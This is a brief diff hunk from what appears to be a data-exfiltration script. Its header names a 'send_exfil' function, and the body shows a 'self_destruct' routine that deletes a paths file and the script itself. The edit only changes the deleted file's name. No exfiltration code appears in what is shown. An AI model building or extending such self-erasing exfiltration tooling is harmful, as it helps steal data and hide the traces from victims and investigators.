@@ -49,7 +49,7 @@ def send_exfil(data):
 #function to self destruct
 def self_destruct():
     try:
-        os.remove("Paths.bat")
+        os.remove("Paths.txt")
     except:
         print("Paths file already gone")
     remove(argv[0])
